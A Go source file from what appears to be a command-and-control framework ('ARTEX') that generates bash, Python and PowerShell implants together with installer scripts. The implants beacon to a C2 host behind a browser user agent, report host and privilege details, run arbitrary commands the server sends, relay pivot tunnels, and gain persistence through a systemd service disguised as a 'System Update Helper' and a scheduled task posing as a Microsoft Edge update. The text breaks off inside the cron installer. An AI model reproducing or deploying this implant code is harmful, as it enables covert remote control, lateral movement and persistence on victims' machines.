package c2

import (
	"fmt"
	"os"
	"path/filepath"
	"strings"
)

// Implant version reported in beacons; bump when the protocol changes.
const implantVersion = "1.0"

// Check-in user agents. The stock curl/urllib/Invoke-WebRequest agents are
// recognizable, so generated implants look like ordinary browser traffic.
const (
	uaLinux   = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
	uaWindows = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0"
)

// implantFileName maps a runtime to its script filename.
func implantFileName(runtime string) string {
	switch runtime {
	case "python3":
		return "implant.py"
	case "powershell":
		return "implant.ps1"
	default:
		return "implant.sh"
	}
}

// installFileName maps a persistence mode to its helper filename.
func installFileName(platform, persistence string) string {
	if platform == "windows" {
		return "install-" + persistence + ".ps1"
	}
	return "install-" + persistence + ".sh"
}

// writeImplantFiles generates the implant plus every install helper and a
// README into builds/<id>/.
func writeImplantFiles(dir string, im *Implant) error {
	buildDir := filepath.Join(dir, "builds", im.ID)
	if err := os.MkdirAll(buildDir, 0o700); err != nil {
		return fmt.Errorf("c2: mkdir build: %w", err)
	}
	var script string
	switch im.Runtime {
	case "python3":
		script = pythonImplant(im)
	case "powershell":
		script = powershellImplant(im)
	default:
		script = bashImplant(im)
	}
	if err := os.WriteFile(filepath.Join(buildDir, implantFileName(im.Runtime)), []byte(script), 0o700); err != nil {
		return fmt.Errorf("c2: write implant: %w", err)
	}
	if im.Platform == "windows" {
		for _, p := range []string{"none", "schtasks"} {
			body := powershellInstall(im, p)
			if err := os.WriteFile(filepath.Join(buildDir, installFileName(im.Platform, p)), []byte(body), 0o700); err != nil {
				return fmt.Errorf("c2: write installer: %w", err)
			}
		}
	} else {
		for _, p := range []string{"none", "systemd", "cron"} {
			body := bashInstall(im, p)
			if err := os.WriteFile(filepath.Join(buildDir, installFileName(im.Platform, p)), []byte(body), 0o700); err != nil {
				return fmt.Errorf("c2: write installer: %w", err)
			}
		}
	}
	readme := implantReadme(im)
	if err := os.WriteFile(filepath.Join(buildDir, "README.txt"), []byte(readme), 0o600); err != nil {
		return fmt.Errorf("c2: write readme: %w", err)
	}
	return nil
}

// InstallCommand returns the remote one-liner that installs the implant with
// the requested persistence, assuming the build directory was staged in
// remoteDir. It doubles as the operator's manual instruction.
func InstallCommand(im *Implant, persistence, remoteDir string) string {
	if persistence == "" {
		persistence = "none"
	}
	name := installFileName(im.Platform, persistence)
	dir := strings.TrimRight(remoteDir, "/")
	if im.Platform == "windows" {
		return fmt.Sprintf(`powershell -NoProfile -ExecutionPolicy Bypass -File "%s\%s"`, dir, name)
	}
	return fmt.Sprintf("cd %s && chmod +x %s implant.sh 2>/dev/null; bash ./%s", dir, name, name)
}

// CallbackURL builds the absolute check-in URL for an implant.
func CallbackURL(im *Implant, baseURL string) string {
	base := strings.TrimRight(baseURL, "/")
	if base == "" {
		base = "https://C2_HOST"
	}
	return base + "/api/c2/" + im.BeaconPath
}

// ResultURL builds the absolute result URL for an implant.
func ResultURL(im *Implant, baseURL string) string {
	base := strings.TrimRight(baseURL, "/")
	if base == "" {
		base = "https://C2_HOST"
	}
	return base + "/api/c2/" + im.RespPath
}

func implantReadme(im *Implant) string {
	var b strings.Builder
	b.WriteString("ARTEX C2 implant\n\n")
	fmt.Fprintf(&b, "id:          %s\n", im.ID)
	fmt.Fprintf(&b, "label:       %s\n", im.Label)
	fmt.Fprintf(&b, "platform:    %s (%s)\n", im.Platform, im.Runtime)
	fmt.Fprintf(&b, "encoding:    %s\n", im.Encrypt)
	fmt.Fprintf(&b, "sleep:       %ds (+/-%d%%)\n", im.SleepSeconds, im.JitterPct)
	fmt.Fprintf(&b, "persistence: %s\n\n", im.Persistence)
	fmt.Fprintf(&b, "beacon:      %s\n", CallbackURL(im, im.BaseURL))
	fmt.Fprintf(&b, "results:     %s\n\n", ResultURL(im, im.BaseURL))
	b.WriteString("Install helpers in this directory:\n")
	for _, p := range []string{"none", "systemd", "cron", "schtasks"} {
		name := installFileName(im.Platform, p)
		if _, err := os.Stat(name); err == nil {
			fmt.Fprintf(&b, "  %s\n", name)
		}
	}
	b.WriteString("\nToken is embedded in the implant; treat the script as a secret.\n")
	return b.String()
}

// bashImplant renders a Linux shell implant. It parses the task from
// response headers (no JSON parser needed on the target) and encrypts with
// openssl when aes is requested.
func bashImplant(im *Implant) string {
	base := im.BaseURL
	if base == "" {
		base = "https://C2_HOST"
	}
	script := `#!/usr/bin/env bash
# ARTEX agent helper {{ID}} ({{LABEL}})
# Keep private: the file embeds the beacon token.
set -u
BASE='{{BASE}}'
ID='{{ID}}'
TOK='{{TOKEN}}'
ENC='{{ENC}}'
BPATH='{{BEACON}}'
RPATH='{{RESP}}'
SLEEP={{SLEEP}}
JIT={{JIT}}
TMO={{TIMEOUT}}
VER='{{VER}}'
UA='{{UA}}'

command -v curl >/dev/null 2>&1 || exit 1

LOCK="${TMPDIR:-/tmp}/.atx-${ID}"
TUNDIR="${TMPDIR:-/tmp}/.atx-${ID}-tun"
HDRS=$(mktemp) || exit 1
BODY=$(mktemp)
OUT=$(mktemp)
cleanup() { : > "$TUNDIR/stop" 2>/dev/null; sleep 1; rm -rf "$TUNDIR"; rmdir "$LOCK" 2>/dev/null; rm -f "$HDRS" "$BODY" "$OUT"; }
if mkdir "$LOCK" 2>/dev/null; then trap cleanup EXIT; else rm -f "$HDRS" "$BODY" "$OUT"; exit 0; fi
mkdir -p "$TUNDIR" 2>/dev/null

jesc() { printf '%s' "$1" | sed -e 's/\\/\\\\/g' -e 's/"/\\"/g' | tr -d '\n'; }
jout() { sed -e 's/\\/\\\\/g' -e 's/"/\\"/g' | awk '{printf "%s\\n", $0}'; }
sha() { if command -v sha256sum >/dev/null 2>&1; then sha256sum; else shasum -a 256; fi; }
b64() { base64 | tr -d '\n'; }
b64d() { base64 -d 2>/dev/null || base64 -D 2>/dev/null; }
TMOBIN=''
command -v timeout >/dev/null 2>&1 && TMOBIN=timeout
[ -z "$TMOBIN" ] && command -v gtimeout >/dev/null 2>&1 && TMOBIN=gtimeout
# tunecho/tunread move bytes without blocking the beacon loop. Where GNU
# timeout exists it bounds the copy; otherwise (stock macOS) dd runs
# backgrounded and is killed once the first chunk lands or ~1s passes.
tunecho() {
  local p i
  if [ -n "$TMOBIN" ]; then
    "$TMOBIN" 1 dd bs=16384 count=1 <&4 >&3 2>/dev/null
    return
  fi
  dd bs=16384 count=1 <&4 >&3 2>/dev/null & p=$!
  for i in 1 2 3 4 5 6; do
    sleep 0.05
    kill -0 "$p" 2>/dev/null || break
  done
  kill "$p" 2>/dev/null
  wait "$p" 2>/dev/null
}
tunread() {
  local p i
  if [ -n "$TMOBIN" ]; then
    "$TMOBIN" 1 dd bs=8192 count=1 <&3 2>/dev/null
    return
  fi
  dd bs=8192 count=1 <&3 2>/dev/null & p=$!
  for i in 1 2 3 4 5 6; do
    sleep 0.05
    kill -0 "$p" 2>/dev/null || break
  done
  kill "$p" 2>/dev/null
  wait "$p" 2>/dev/null
}

# post URL  (raw JSON on stdin): encodes, stores body/headers, echoes status.
post() {
  local url=$1 raw body
  local args=()
  raw=$(cat)
  if [ "$ENC" = aes ] && command -v openssl >/dev/null 2>&1; then
    local key iv
    key=$(printf 'artex-c2:%s' "$TOK" | sha | cut -d' ' -f1)
    iv=$(od -An -tx1 -N16 /dev/urandom | tr -d ' \n')
    body=$(printf '%s' "$raw" | openssl enc -aes-256-cbc -nosalt -K "$key" -iv "$iv" 2>/dev/null | b64)
    args=(-H "X-Request-ID: $TOK" -H "X-Artex-Enc: aes" -H "X-IV: $iv")
  else
    body=$(printf '%s' "$raw" | b64)
    args=(-H "X-Request-ID: $TOK" -H "X-Artex-Enc: none")
  fi
  curl -sS -m 45 -o "$BODY" -D "$HDRS" -w '%{http_code}' -A "$UA" -X POST "${args[@]}" --data-binary "$body" "$url" 2>/dev/null
}

hget() { awk -v k="$1" 'tolower($1)==k{print $2}' "$HDRS" | tr -d '\r' | head -1; }

pause() {
  local j d
  # A live tunnel needs a short cycle so relayed traffic keeps moving.
  case "$(ls -d "$TUNDIR"/*/*/ 2>/dev/null)" in ''|"$TUNDIR"/*/*/) : ;; esac
  if [ -n "$(ls -d "$TUNDIR"/*/*/ 2>/dev/null)" ]; then sleep 1; return; fi
  j=$(( SLEEP * JIT / 100 ))
  d=$(( SLEEP - j + (RANDOM % (2*j+1)) ))
  [ "$d" -lt 1 ] && d=1
  sleep "$d"
}

# ---- implant pivot tunnel -------------------------------------------------
# Frames: <tun>|<conn>|<op>|<b64> with op open|data|close. Downlink arrives as
# cmd=tunnel; uplink is posted to the normal result path with task_id "tun".
# Each connection gets a FIFO so the worker thread never blocks the beacon
# loop, and nothing but FIFOs/tokens touches disk.
tunq() { printf '%s\n' "$1" >> "$TUNDIR/up"; }
tunlock() { until mkdir "$TUNDIR/.lk" 2>/dev/null; do sleep 0.02; done; }
tununlock() { rmdir "$TUNDIR/.lk" 2>/dev/null; }

# tun_worker tun conn host port dir — one background relay per connection.
tun_worker() {
  local t=$1 c=$2 host=$3 port=$4 d=$5 out
  exec 3<>"/dev/tcp/$host/$port" 2>/dev/null || { tunq "$t|$c|close|"; rm -rf "$d"; return; }
  exec 4<>"$d/in"
  tunq "$t|$c|open|"
  while [ ! -e "$d/stop" ] && [ ! -e "$TUNDIR/stop" ]; do
    tunecho
    out=$(tunread | b64)
    if [ -n "$out" ]; then tunq "$t|$c|data|$out"; else sleep 0.2; fi
  done
  exec 3<&- 4<&-
  tunq "$t|$c|close|"
  rm -rf "$d"
}

tun_open() { # tun conn b64target
  local d="$TUNDIR/$1/$2" hp host port
  hp=$(printf '%s' "$3" | b64d)
  host=${hp%:*}
  port=${hp##*:}
  mkdir -p "$d"
  mkfifo "$d/in" 2>/dev/null
  # Probe the dial first: exec redirection failure exits a subshell, so the
  # probe catches it and the beacon loop stays in control.
  ( exec 3<>"/dev/tcp/$host/$port" ) 2>/dev/null || { tunq "$1|$2|close|"; rm -rf "$d"; return; }
  ( tun_worker "$1" "$2" "$host" "$port" "$d" ) >/dev/null 2>&1 &
}

tun_data() { # tun conn b64payload
  local d="$TUNDIR/$1/$2"
  [ -p "$d/in" ] || return 0
  if [ -n "$TMOBIN" ]; then
    printf '%s' "$3" | b64d | "$TMOBIN" 5 dd of="$d/in" bs=16384 2>/dev/null
  else
    printf '%s' "$3" | b64d | dd of="$d/in" bs=16384 2>/dev/null
  fi
}

tun_close() { local d="$TUNDIR/$1/$2"; [ -d "$d" ] && : > "$d/stop"; }

# tun_flush — post buffered uplink frames in batches the body limit tolerates.
tun_flush() {
  local lines line n=0 batch=''
  [ -s "$TUNDIR/up" ] || return 0
  tunlock
  lines=$(cat "$TUNDIR/up" 2>/dev/null)
  : > "$TUNDIR/up"
  tununlock
  [ -n "$lines" ] || return 0
  while IFS= read -r line; do
    [ -n "$line" ] || continue
    batch="${batch}${line}
"
    n=$((n+1))
    if [ "$n" -ge 16 ]; then tunpost "$batch"; batch=''; n=0; fi
  done <<EOF
$lines
EOF
  [ -n "$batch" ] && tunpost "$batch"
  return 0
}

tunpost() { # newline-separated raw frames
  local out res
  out=$(printf '%s' "$1" | b64)
  res=$(printf '{"id":"%s","task_id":"tun","output":"%s","exit":0}' "$ID" "$out")
  printf '%s' "$res" | post "$BASE/api/c2/$RPATH" >/dev/null
}

while :; do
  json=$(printf '{"id":"%s","h":"%s","u":"%s","o":"%s","a":"%s","p":%s,"e":%s,"c":"%s","v":"%s"}' \
    "$ID" "$(jesc "$(hostname 2>/dev/null)")" "$(jesc "$(id -un 2>/dev/null)")" \
    "$(jesc "$(uname -s 2>/dev/null)")" "$(jesc "$(uname -m 2>/dev/null)")" "$$" \
    "$([ "$(id -u 2>/dev/null)" = 0 ] && echo true || echo false)" \
    "$(jesc "$(pwd)")" "$VER")
  code=$(printf '%s' "$json" | post "$BASE/api/c2/$BPATH")
  if [ "$code" != 200 ]; then tun_flush; pause; continue; fi
  tid=$(hget x-task-id:)
  case "$tid" in ''|*[!0-9]*) tun_flush; pause; continue ;; esac
  cmd=$(hget x-task-cmd:)
  if [ "$cmd" = tunnel ]; then
    fr=$(hget x-task-args: | b64d)
    tun=${fr%%|*}
    r1=${fr#*|}
    cid=${r1%%|*}
    r2=${r1#*|}
    op=${r2%%|*}
    data=${r2#*|}
    case "$op" in
      open)  tun_open "$tun" "$cid" "$data" ;;
      data)  tun_data "$tun" "$cid" "$data" ;;
      close) tun_close "$tun" "$cid" ;;
    esac
    tun_flush
    pause
    continue
  fi
  if [ "$cmd" = kill ]; then
    systemctl disable --now "sysupd-${ID}.service" >/dev/null 2>&1
    crontab -l 2>/dev/null | grep -v "atx-${ID}" | crontab - 2>/dev/null
    rm -f "$HOME/.local/share/.atx-${ID}.sh" "/usr/local/lib/.atx-${ID}.sh" 2>/dev/null
    exit 0
  fi
  tmo=$(hget x-task-timeout:)
  case "$tmo" in ''|*[!0-9]*) tmo=$TMO ;; esac
  args=$(hget x-task-args: | base64 -d 2>/dev/null)
  if command -v timeout >/dev/null 2>&1; then
    timeout "$tmo" bash -c "$args" >"$OUT" 2>&1
  else
    bash -c "$args" >"$OUT" 2>&1
  fi
  rc=$?
  res=$(printf '{"id":"%s","task_id":"%s","output":"%s","exit":%s}' \
    "$ID" "$tid" "$(head -c 60000 "$OUT" | jout)" "$rc")
  printf '%s' "$res" | post "$BASE/api/c2/$RPATH" >/dev/null
  tun_flush
  pause
done
`
	rep := strings.NewReplacer(
		"{{ID}}", im.ID,
		"{{TOKEN}}", im.Token,
		"{{LABEL}}", im.Label,
		"{{ENC}}", im.Encrypt,
		"{{BASE}}", base,
		"{{BEACON}}", im.BeaconPath,
		"{{RESP}}", im.RespPath,
		"{{SLEEP}}", fmt.Sprint(im.SleepSeconds),
		"{{JIT}}", fmt.Sprint(im.JitterPct),
		"{{TIMEOUT}}", fmt.Sprint(defaultTimeout),
		"{{VER}}", implantVersion,
		"{{UA}}", uaLinux,
	)
	return rep.Replace(script)
}

// pythonImplant renders a Linux Python3 implant (encrypt=none only; the
// stdlib has no AES, so payloads are base64(JSON)).
func pythonImplant(im *Implant) string {
	base := im.BaseURL
	if base == "" {
		base = "https://C2_HOST"
	}
	script := `#!/usr/bin/env python3
# ARTEX agent helper {{ID}} ({{LABEL}})
# Keep private: the file embeds the beacon token.
import base64, json, os, random, socket, subprocess, sys, threading, time, urllib.request

BASE = "{{BASE}}"
ID = "{{ID}}"
TOK = "{{TOKEN}}"
BPATH = "{{BEACON}}"
RPATH = "{{RESP}}"
SLEEP = {{SLEEP}}
JIT = {{JIT}}
TMO = {{TIMEOUT}}
VER = "{{VER}}"
UA = "{{UA}}"

def post(url, obj, timeout=45):
    body = base64.b64encode(json.dumps(obj).encode())
    req = urllib.request.Request(url, data=body, method="POST")
    req.add_header("Content-Type", "application/octet-stream")
    req.add_header("User-Agent", UA)
    req.add_header("X-Request-ID", TOK)
    req.add_header("X-Artex-Enc", "none")
    with urllib.request.urlopen(req, timeout=timeout) as r:
        code = r.status
        headers = dict(r.headers)
        raw = r.read()
    if code == 200 and raw:
        try:
            return headers, json.loads(base64.b64decode(raw).decode())
        except Exception:
            return headers, None
    return headers, None

# ---- implant pivot tunnel --------------------------------------------------
# Frames: <tun>|<conn>|<op>|<b64> with op open|data|close. Downlink arrives as
# cmd=tunnel; uplink is posted to the normal result path with task_id "tun".
TUN_LOCK = threading.Lock()
TUN_CONNS = {}  # (tun, conn) -> {"sock": socket}
TUN_OUT = []    # pending uplink frame strings

def tunq(line):
    with TUN_LOCK:
        TUN_OUT.append(line)

def tun_open(tid, cid, target):
    host, _, port = target.rpartition(":")
    try:
        s = socket.create_connection((host, int(port)), timeout=10)
    except Exception:
        tunq("%s|%s|close|" % (tid, cid))
        return
    with TUN_LOCK:
        TUN_CONNS[(tid, cid)] = {"sock": s}
    tunq("%s|%s|open|" % (tid, cid))
    threading.Thread(target=tun_reader, args=(tid, cid), daemon=True).start()

def tun_reader(tid, cid):
    with TUN_LOCK:
        st = TUN_CONNS.get((tid, cid))
    if st is None:
        return
    try:
        while True:
            with TUN_LOCK:
                if (tid, cid) not in TUN_CONNS:
                    return
            data = st["sock"].recv(16384)
            if not data:
                break
            tunq("%s|%s|data|%s" % (tid, cid, base64.b64encode(data).decode()))
    except Exception:
        pass
    tun_close(tid, cid)

def tun_data(tid, cid, payload):
    with TUN_LOCK:
        st = TUN_CONNS.get((tid, cid))
    if st is None:
        return
    try:
        st["sock"].sendall(payload)
    except Exception:
        tun_close(tid, cid)

def tun_close(tid, cid):
    with TUN_LOCK:
        st = TUN_CONNS.pop((tid, cid), None)
    if st is not None:
        try:
            st["sock"].close()
        except Exception:
            pass
        tunq("%s|%s|close|" % (tid, cid))

def tun_active():
    with TUN_LOCK:
        return bool(TUN_CONNS)

def tun_flush():
    with TUN_LOCK:
        if not TUN_OUT:
            return
        batch = TUN_OUT[:16]
        del TUN_OUT[:16]
    res = {"id": ID, "task_id": "tun",
           "output": base64.b64encode(("\n".join(batch) + "\n").encode()).decode(),
           "exit": 0}
    try:
        post(BASE + "/api/c2/" + RPATH, res)
    except Exception:
        with TUN_LOCK:
            TUN_OUT[0:0] = batch  # retry on the next cycle

def loop():
    while True:
        b = {
            "id": ID,
            "h": socket.gethostname(),
            "u": os.environ.get("USER") or os.environ.get("LOGNAME") or "",
            "o": sys.platform,
            "a": os.uname().machine if hasattr(os, "uname") else "",
            "p": os.getpid(),
            "e": os.geteuid() == 0 if hasattr(os, "geteuid") else False,
            "c": os.getcwd(),
            "v": VER,
        }
        headers, _ = post(BASE + "/api/c2/" + BPATH, b)
        tid = (headers.get("X-Task-Id") or "").strip()
        if tid.isdigit():
            cmd = (headers.get("X-Task-Cmd") or "").strip()
            if cmd == "kill":
                try:
                    subprocess.run(["systemctl", "disable", "--now", "sysupd-%s.service" % ID],
                                   capture_output=True)
                except Exception:
                    pass
                return
            args64 = (headers.get("X-Task-Args") or "").strip()
            tmo = (headers.get("X-Task-Timeout") or "").strip()
            try:
                tmo = max(1, int(tmo))
            except ValueError:
                tmo = TMO
            args = base64.b64decode(args64).decode("utf-8", "replace") if args64 else ""
            if cmd == "tunnel":
                # <tun>|<conn>|<op>|<b64payload>
                try:
                    tun_, cid, op, data = args.split("|", 3)
                    payload = base64.b64decode(data) if data else b""
                except Exception:
                    payload = None
                    tun_, cid, op = "", "", ""
                if op == "open":
                    tun_open(tun_, cid, payload.decode("utf-8", "replace"))
                elif op == "data" and payload is not None:
                    tun_data(tun_, cid, payload)
                elif op == "close":
                    tun_close(tun_, cid)
                tun_flush()
                time.sleep(0.3)
                continue
            res = {"id": ID, "task_id": tid, "output": "", "exit": 0}
            if args:
                try:
                    p = subprocess.run(args, shell=True, capture_output=True,
                                       timeout=tmo, text=True, errors="replace")
                    res["output"] = (p.stdout + p.stderr)[:250000]
                    res["exit"] = p.returncode
                except subprocess.TimeoutExpired:
                    res["output"] = "(timeout after %ss)" % tmo
                    res["exit"] = 124
                except Exception as exc:
                    res["error"] = str(exc)[:2000]
            post(BASE + "/api/c2/" + RPATH, res)
        tun_flush()
        if tun_active():
            time.sleep(0.3)  # short cycle while a tunnel has open connections
            continue
        jitter = SLEEP * JIT // 100
        time.sleep(max(1, SLEEP - jitter + random.randint(0, 2 * jitter)))

if __name__ == "__main__":
    try:
        loop()
    except KeyboardInterrupt:
        pass
`
	rep := strings.NewReplacer(
		"{{ID}}", im.ID,
		"{{TOKEN}}", im.Token,
		"{{LABEL}}", im.Label,
		"{{BASE}}", base,
		"{{BEACON}}", im.BeaconPath,
		"{{RESP}}", im.RespPath,
		"{{SLEEP}}", fmt.Sprint(im.SleepSeconds),
		"{{JIT}}", fmt.Sprint(im.JitterPct),
		"{{TIMEOUT}}", fmt.Sprint(defaultTimeout),
		"{{VER}}", implantVersion,
		"{{UA}}", uaLinux,
	)
	return rep.Replace(script)
}

// powershellImplant renders a Windows PowerShell implant (uses curl.exe or
// Invoke-WebRequest fallback; AES-256-CBC via .NET when enabled).
func powershellImplant(im *Implant) string {
	base := im.BaseURL
	if base == "" {
		base = "https://C2_HOST"
	}
	script := `# ARTEX agent helper {{ID}} ({{LABEL}})
# Keep private: the file embeds the beacon token.
$Base = "{{BASE}}"
$ID = "{{ID}}"
$Tok = "{{TOKEN}}"
$Enc = "{{ENC}}"
$BPath = "{{BEACON}}"
$RPath = "{{RESP}}"
$Sleep = {{SLEEP}}
$Jit = {{JIT}}
$Tmo = {{TIMEOUT}}
$Ver = "{{VER}}"
$UA = "{{UA}}"

$Key = [System.Text.Encoding]::UTF8.GetBytes(("artex-c2:" + $Tok))
$Sha = [System.Security.Cryptography.SHA256]::Create()
$Key = $Sha.ComputeHash($Key)

function ConvertTo-Encoded([string]$Json) {
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($Json)
    if ($Enc -eq "aes") {
        $aes = New-Object System.Security.Cryptography.AesCryptoServiceProvider
        $aes.Key = $Key; $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
        $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
        $aes.GenerateIV()
        $enc2 = $aes.CreateEncryptor()
        $ct = $enc2.TransformFinalBlock($bytes, 0, $bytes.Length)
        return @{ Body = [Convert]::ToBase64String($ct); Enc = "aes"; IV = [BitConverter]::ToString($aes.IV).Replace("-", "").ToLower() }
    }
    return @{ Body = [Convert]::ToBase64String($bytes); Enc = "none"; IV = "" }
}

function ConvertFrom-Encoded([string]$Body, [string]$EncIn, [string]$IVHex) {
    $raw = [Convert]::FromBase64String($Body.Trim())
    if ($EncIn -eq "aes") {
        $iv = New-Object byte[] 16
        for ($i = 0; $i -lt 16; $i++) { $iv[$i] = [Convert]::ToByte($IVHex.Substring($i*2, 2), 16) }
        $aes = New-Object System.Security.Cryptography.AesCryptoServiceProvider
        $aes.Key = $Key; $aes.IV = $iv
        $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
        $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
        $dec = $aes.CreateDecryptor()
        $raw = $dec.TransformFinalBlock($raw, 0, $raw.Length)
    }
    return [System.Text.Encoding]::UTF8.GetString($raw) | ConvertFrom-Json
}

function Post-Json([string]$Url, [string]$Json, [int]$TimeoutSec) {

    $p = ConvertTo-Encoded $Json
    $headers = @{ "X-Request-ID" = $Tok; "X-Artex-Enc" = $p.Enc; "User-Agent" = $UA }
    if ($p.IV) { $headers["X-IV"] = $p.IV }
    $resp = Invoke-WebRequest -Uri $Url -Method Post -Headers $headers -ContentType "application/octet-stream" -Body $p.Body -TimeoutSec $TimeoutSec -UseBasicParsing
    return $resp
}

# ---- implant pivot tunnel --------------------------------------------------
# Frames: <tun>|<conn>|<op>|<b64> with op open|data|close. Downlink arrives as
# cmd=tunnel; uplink is posted to the normal result path with task_id "tun".
# PowerShell has no cheap threads, so relays are polled from the beacon loop.
$script:Conn = @{}
$script:Q = New-Object System.Collections.ArrayList
$script:NL = [string][char]10

function B64d([string]$S) { [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($S)) }

function TunOpen([string]$Tun, [string]$Cid, [string]$B64Target) {
    $hp = B64d $B64Target
    $i = $hp.LastIndexOf(":")
    if ($i -lt 1) { [void]$script:Q.Add("$Tun|$Cid|close|"); return }
    try {
        $c = New-Object System.Net.Sockets.TcpClient
        $c.Connect($hp.Substring(0, $i), [int]$hp.Substring($i + 1))
    } catch {
        [void]$script:Q.Add("$Tun|$Cid|close|")
        return
    }
    $script:Conn["$Tun|$Cid"] = $c
    [void]$script:Q.Add("$Tun|$Cid|open|")
}

function TunData([string]$Tun, [string]$Cid, [string]$B64) {
    $c = $script:Conn["$Tun|$Cid"]
    if ($null -eq $c) { return }
    try {
        $b = [Convert]::FromBase64String($B64)
        $s = $c.GetStream()
        $s.Write($b, 0, $b.Length)
        $s.Flush()
    } catch { TunClose $Tun $Cid }
}

function TunClose([string]$Tun, [string]$Cid) {
    $k = "$Tun|$Cid"
    $c = $script:Conn[$k]
    if ($null -ne $c) {
        [void]$script:Conn.Remove($k)
        try { $c.Close() } catch {}
        [void]$script:Q.Add("$Tun|$Cid|close|")
    }
}

function TunPump {
    foreach ($k in @($script:Conn.Keys)) {
        $c = $script:Conn[$k]
        $pp = $k.Split("|")
        try {
            $s = $c.GetStream()
            while ($s.DataAvailable) {
                $buf = New-Object byte[] 16384
                $n = $s.Read($buf, 0, $buf.Length)
                if ($n -le 0) { TunClose $pp[0] $pp[1]; break }
                [void]$script:Q.Add(("{0}|{1}|data|{2}" -f $pp[0], $pp[1], [Convert]::ToBase64String($buf, 0, $n)))
            }
        } catch { TunClose $pp[0] $pp[1] }
    }
}

function TunFlush {
    if ($script:Q.Count -eq 0) { return }
    $n = [Math]::Min(16, $script:Q.Count)
    $batch = @($script:Q.GetRange(0, $n))
    $script:Q.RemoveRange(0, $n)
    $out = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((($batch -join $script:NL) + $script:NL)))
    $res = @{ id = $ID; task_id = "tun"; output = $out; exit = 0 } | ConvertTo-Json -Compress
    try { Post-Json ($Base + "/api/c2/" + $RPath) $res 20 | Out-Null } catch {
        $script:Q.InsertRange(0, $batch)
    }
}

$host2 = $env:COMPUTERNAME
$user = $env:USERNAME
$os = "windows"
$arch = $env:PROCESSOR_ARCHITECTURE
$elev = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

while ($true) {
    $beacon = @{ id = $ID; h = $host2; u = $user; o = $os; a = $arch; p = $PID; e = $elev; c = (Get-Location).Path; v = $Ver } | ConvertTo-Json -Compress
    try { $resp = Post-Json ($Base + "/api/c2/" + $BPath) $beacon 45 } catch { Start-Sleep -Seconds $Sleep; continue }
    $tid = ""
    if ($resp.Headers["X-Task-Id"]) { $tid = [string]($resp.Headers["X-Task-Id"][0]) }
    if ($tid -match "^\d+$") {
        $cmd = ""
        if ($resp.Headers["X-Task-Cmd"]) { $cmd = [string]($resp.Headers["X-Task-Cmd"][0]) }
        if ($cmd -eq "kill") {
            schtasks /Change /TN "MicrosoftEdgeUpdateTask$ID" /DISABLE | Out-Null
            exit 0
        }
        $args64 = ""
        if ($resp.Headers["X-Task-Args"]) { $args64 = [string]($resp.Headers["X-Task-Args"][0]) }
        $tmoTask = $Tmo
        if ($resp.Headers["X-Task-Timeout"]) {
            $try = 0
            if ([int]::TryParse([string]($resp.Headers["X-Task-Timeout"][0]), [ref]$try)) { $tmoTask = $try }
        }
        $taskArgs = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($args64))
        if ($cmd -eq "tunnel") {
            $pp = $taskArgs.Split("|", 4)
            if ($pp.Length -eq 4) {
                switch ($pp[2]) {
                    "open" { TunOpen $pp[0] $pp[1] $pp[3] }
                    "data" { TunData $pp[0] $pp[1] $pp[3] }
                    "close" { TunClose $pp[0] $pp[1] }
                }
            }
            TunFlush
            Start-Sleep -Milliseconds 300
            continue
        }
        $out = ""
        $rc = 0
        try {
            $out = (cmd.exe /c $taskArgs 2>&1 | Out-String)
            $rc = $LASTEXITCODE
        } catch {
            $out = $_.Exception.Message
            $rc = 1
        }
        if ($out.Length -gt 250000) { $out = $out.Substring(0, 250000) }
        $result = @{ id = $ID; task_id = $tid; output = $out; exit = $rc } | ConvertTo-Json -Compress
        try { Post-Json ($Base + "/api/c2/" + $RPath) $result 45 | Out-Null } catch {}
    }
    TunPump
    TunFlush
    if ($script:Conn.Count -gt 0) { Start-Sleep -Milliseconds 300; continue }
    $j = $Sleep * $Jit / 100
    Start-Sleep -Seconds (Get-Random -Minimum ([int][Math]::Max(1, $Sleep - $j)) -Maximum ([int][Math]::Max(2, $Sleep + $j + 1)))
}
`
	rep := strings.NewReplacer(
		"{{ID}}", im.ID,
		"{{TOKEN}}", im.Token,
		"{{LABEL}}", im.Label,
		"{{ENC}}", im.Encrypt,
		"{{BASE}}", base,
		"{{BEACON}}", im.BeaconPath,
		"{{RESP}}", im.RespPath,
		"{{SLEEP}}", fmt.Sprint(im.SleepSeconds),
		"{{JIT}}", fmt.Sprint(im.JitterPct),
		"{{TIMEOUT}}", fmt.Sprint(defaultTimeout),
		"{{VER}}", implantVersion,
		"{{UA}}", uaWindows,
	)
	return rep.Replace(script)
}

// bashInstall renders a Linux installer for persistence mode none|systemd|cron.
func bashInstall(im *Implant, persistence string) string {
	base := im.BaseURL
	if base == "" {
		base = "https://C2_HOST"
	}
	var body string
	switch persistence {
	case "systemd":
		body = `#!/usr/bin/env bash
# ARTEX installer (systemd) for {{ID}}
set -eu
SRC="$(cd "$(dirname "$0")" && pwd)"
if [ "$(id -u)" = 0 ]; then LIB=/usr/local/lib; else LIB="$HOME/.local/share"; mkdir -p "$LIB"; fi
cp "$SRC/implant.sh" "$LIB/.atx-{{ID}}.sh"
chmod 700 "$LIB/.atx-{{ID}}.sh"
if command -v systemctl >/dev/null 2>&1 && [ "$(id -u)" = 0 ]; then
  cat > /etc/systemd/system/sysupd-{{ID}}.service <<UNIT
[Unit]
Description=System Update Helper
After=network-online.target

[Service]
Type=simple
ExecStart=/bin/bash $LIB/.atx-{{ID}}.sh
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
UNIT
  systemctl daemon-reload
  systemctl enable --now sysupd-{{ID}}.service
  echo "installed: systemctl status sysupd-{{ID}}.service"
else
  nohup setsid /bin/bash "$LIB/.atx-{{ID}}.sh" >/dev/null 2>&1 &
  echo "installed (nohup fallback, no root systemd): $LIB/.atx-{{ID}}.sh"
fi
`
	case "cron":
